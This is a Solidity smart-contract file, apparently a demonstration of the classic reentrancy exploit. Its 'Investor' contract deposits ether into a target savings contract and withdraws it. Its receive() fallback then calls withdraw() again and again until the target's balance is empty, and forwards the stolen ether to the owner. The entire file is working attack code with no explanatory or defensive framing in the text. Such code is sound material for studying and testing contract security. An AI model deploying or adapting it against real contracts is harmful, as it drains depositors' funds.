// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ISavingsAccount {
  function deposit() external payable;
  function withdraw() external;
}

contract Investor is Ownable {
  ISavingsAccount public immutable savingsAccount;

  constructor(address _savingsAccountAddress) {
    savingsAccount = ISavingsAccount(_savingsAccountAddress);
  }

  function attack() external payable onlyOwner() {
    savingsAccount.deposit{ value: msg.value }();
    savingsAccount.withdraw();
  }

  receive() external payable {
    if (address(savingsAccount).balance > 0) {
      savingsAccount.withdraw();
    } else {
      payable(owner()).transfer(address(this).balance);
    }    
  }
}